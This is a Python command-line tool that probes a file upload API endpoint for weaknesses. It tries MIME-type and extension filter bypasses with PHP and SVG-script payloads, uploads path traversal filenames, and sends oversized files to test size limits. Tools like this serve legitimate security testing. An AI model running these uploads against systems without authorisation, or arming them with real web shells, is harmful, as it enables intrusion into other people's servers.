#!/usr/bin/env python3
"""Test API file upload endpoints for security vulnerabilities.

Usage:
    python agent.py --url https://target.com/api/upload --token TOKEN --test mime-bypass
    python agent.py --url https://target.com/api/upload --token TOKEN --test extension-bypass
    python agent.py --url https://target.com/api/upload --token TOKEN --test path-traversal
    python agent.py --url https://target.com/api/upload --token TOKEN --test size-limit --max-size 100
"""

import argparse
import json
import subprocess
import tempfile
from pathlib import Path
from typing import Any


def test_mime_bypass(url: str, token: str) -> dict[str, Any]:
    """Test MIME type validation bypass on upload endpoint."""
    payloads = [
        ("shell.php", "image/jpeg", b"<?php echo 'test'; ?>"),
        ("xss.svg", "image/svg+xml", b"<svg><script>alert(1)</script></svg>"),
        ("shell.php.jpg", "image/jpeg", b"<?php phpinfo(); ?>"),
    ]
    findings: list[dict[str, Any]] = []
    for filename, mime, content in payloads:
        with tempfile.NamedTemporaryFile(suffix=filename, delete=False) as tmp:
            tmp.write(content)
            tmp.flush()
            cmd = [
                "curl",
                "-s",
                "-o",
                "/dev/null",
                "-w",
                "%{http_code}",
                "-H",
                f"Authorization: Bearer {token}",
                "-F",
                f"file=@{tmp.name};type={mime};filename={filename}",
                url,
            ]
            try:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
                status = int(result.stdout.strip())
                findings.append(
                    {
                        "filename": filename,
                        "mime": mime,
                        "status": status,
                        "accepted": status in (200, 201),
                    }
                )
            except (subprocess.TimeoutExpired, ValueError):
                findings.append({"filename": filename, "error": "timeout"})
            finally:
                Path(tmp.name).unlink(missing_ok=True)
    return {
        "test": "mime_bypass",
        "findings": findings,
        "vulnerable": any(f.get("accepted") for f in findings),
    }


def test_extension_bypass(url: str, token: str) -> dict[str, Any]:
    """Test file extension filtering bypass techniques."""
    extensions = [
        "test.php5",
        "test.phtml",
        "test.PhP",
        "test.php.jpg",
        "test.php.bak",
        "test.php%00.jpg",
    ]
    findings: list[dict[str, Any]] = []
    for ext in extensions:
        with tempfile.NamedTemporaryFile(suffix=".txt", delete=False) as tmp:
            tmp.write(b"<?php echo 'bypass'; ?>")
            tmp.flush()
            cmd = [
                "curl",
                "-s",
                "-o",
                "/dev/null",
                "-w",
                "%{http_code}",
                "-H",
                f"Authorization: Bearer {token}",
                "-F",
                f"file=@{tmp.name};filename={ext}",
                url,
            ]
            try:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
                status = int(result.stdout.strip())
                findings.append(
                    {
                        "extension": ext,
                        "status": status,
                        "accepted": status in (200, 201),
                    }
                )
            except (subprocess.TimeoutExpired, ValueError):
                findings.append({"extension": ext, "error": "timeout"})
            finally:
                Path(tmp.name).unlink(missing_ok=True)
    return {
        "test": "extension_bypass",
        "findings": findings,
        "vulnerable": any(f.get("accepted") for f in findings),
    }


def test_path_traversal(url: str, token: str) -> dict[str, Any]:
    """Test path traversal in upload filename parameter."""
    traversal_names = [
        "../../../tmp/traversal_test.txt",
        "..%2F..%2F..%2Ftmp%2Ftest.txt",
        "....//....//tmp/test.txt",
    ]
    findings: list[dict[str, Any]] = []
    for filename in traversal_names:
        with tempfile.NamedTemporaryFile(suffix=".txt", delete=False) as tmp:
            tmp.write(b"path_traversal_test")
            tmp.flush()
            cmd = [
                "curl",
                "-s",
                "-o",
                "/dev/null",
                "-w",
                "%{http_code}",
                "-H",
                f"Authorization: Bearer {token}",
                "-F",
                f"file=@{tmp.name};filename={filename}",
                url,
            ]
            try:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
                status = int(result.stdout.strip())
                findings.append(
                    {
                        "filename": filename,
                        "status": status,
                        "accepted": status in (200, 201),
                    }
                )
            except (subprocess.TimeoutExpired, ValueError):
                findings.append({"filename": filename, "error": "timeout"})
            finally:
                Path(tmp.name).unlink(missing_ok=True)
    return {
        "test": "path_traversal",
        "findings": findings,
        "vulnerable": any(f.get("accepted") for f in findings),
    }


def test_size_limit(url: str, token: str, max_size_mb: int) -> dict[str, Any]:
    """Test file size limit enforcement."""
    sizes = [max_size_mb, max_size_mb * 2, max_size_mb * 10]
    findings: list[dict[str, Any]] = []
    for size in sizes:
        with tempfile.NamedTemporaryFile(suffix=".bin", delete=False) as tmp:
            tmp.write(b"\x00" * (size * 1024 * 1024))
            tmp.flush()
            cmd = [
                "curl",
                "-s",
                "-o",
                "/dev/null",
                "-w",
                "%{http_code}",
                "-H",
                f"Authorization: Bearer {token}",
                "-F",
                f"file=@{tmp.name};filename=large_{size}mb.bin",
                url,
            ]
            try:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
                status = int(result.stdout.strip())
                findings.append(
                    {
                        "size_mb": size,
                        "status": status,
                        "accepted": status in (200, 201),
                    }
                )
            except (subprocess.TimeoutExpired, ValueError):
                findings.append({"size_mb": size, "error": "timeout"})
            finally:
                Path(tmp.name).unlink(missing_ok=True)
    return {
        "test": "size_limit",
        "findings": findings,
        "limit_enforced": not all(f.get("accepted") for f in findings),
    }


def main() -> None:
    parser = argparse.ArgumentParser(description="API file upload vulnerability tester")
    parser.add_argument("--url", required=True, help="Upload endpoint URL")
    parser.add_argument("--token", required=True, help="Authorization token")
    parser.add_argument(
        "--test",
        required=True,
        choices=["mime-bypass", "extension-bypass", "path-traversal", "size-limit"],
        help="Test type to run",
    )
    parser.add_argument(
        "--max-size",
        type=int,
        default=10,
        help="Expected max upload size in MB (for size-limit test)",
    )
    parser.add_argument(
        "--format",
        choices=["json", "text"],
        default="json",
        help="Output format",
    )
    args = parser.parse_args()

    tests = {
        "mime-bypass": lambda: test_mime_bypass(args.url, args.token),
        "extension-bypass": lambda: test_extension_bypass(args.url, args.token),
        "path-traversal": lambda: test_path_traversal(args.url, args.token),
        "size-limit": lambda: test_size_limit(args.url, args.token, args.max_size),
    }
    result = tests[args.test]()
    print(json.dumps(result, indent=2))


if __name__ == "__main__":
    main()
